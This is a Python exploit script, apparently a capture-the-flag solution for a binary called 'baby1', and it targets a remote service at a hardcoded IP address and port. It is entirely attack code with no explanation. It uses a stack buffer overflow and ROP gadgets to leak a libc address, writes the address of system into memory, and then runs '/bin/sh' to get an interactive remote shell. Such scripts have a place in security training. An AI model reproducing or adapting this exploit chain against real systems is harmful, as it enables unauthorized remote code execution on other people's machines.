from ptrlib import *

elf = ELF("./baby1")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
sock = Socket("51.254.114.246", 1111)
#libc = ELF("/lib64/libc.so.6")
#sock = Socket("127.0.0.1", 4001)
#_ = input()

plt_write = 0x004004b0
plt_read = 0x004004c0
plt_setvbuf = 0x004004e0
plt_resolve = 0x004004a0
rop_pop_rdi = 0x004006c3
rop_pop_rsi_pop_r15 = 0x004006c1
rop_libc_csu_init = 0x004006ba
call_libc_csu_init = 0x004006a0

""" Stage 1 """
payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(elf.got("write")) # r12 --> call [r12]
payload += p64(8)                # r13 --> rdx
payload += p64(elf.got("write")) # r14 --> rsi
payload += p64(1)                # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8 # add rsp, 8
payload += p64(0)                # rbx
payload += p64(0)                # rbp --> loop max
payload += p64(0x400018)         # r12 --> call [r12]
payload += p64(0)                # r13 --> rdx
payload += p64(0)                # r14 --> rsi
payload += p64(0)                # r15 --> rdi

payload += p64(call_libc_csu_init)

sock.recvline()
sock.send(payload)
addr = u64(sock.recv(8))
libc_base = addr - libc.symbol("write")
addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.find("/bin/sh"))
dump("libc base = " + hex(libc_base))

""" Stage 2 """
sock.recvline()

addr_store = elf.symbol("__bss_start") + 8

payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(elf.got("read"))  # r12 --> call [r12]
payload += p64(8)                # r13 --> rdx
payload += p64(addr_store)       # r14 --> rsi
payload += p64(0)                # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8 # add rsp, 8
payload += p64(0)                # rbx
payload += p64(0)                # rbp --> loop max
payload += p64(0x400018)         # r12 --> call [r12]
payload += p64(0)                # r13 --> rdx
payload += p64(0)                # r14 --> rsi
payload += p64(0)                # r15 --> rdi

payload += p64(call_libc_csu_init)

payload = payload + b'X' * (0x12c - len(payload))

sock.send(payload)
sock.send(p64(addr_system))

dump("wrote <system> to " + hex(addr_store))

""" Stage 3 """
sock.recvline()

call_libc_csu_init_direct = 0x004006a9

payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(addr_store)       # r12 --> call [r12]
payload += p64(0)                # r13 --> rdx
payload += p64(0)                # r14 --> rsi
payload += p64(0)                # r15 --> rdi

payload += p64(rop_pop_rdi)
payload += p64(addr_binsh)

payload += p64(call_libc_csu_init_direct)

sock.send(payload)

sock.interactive()
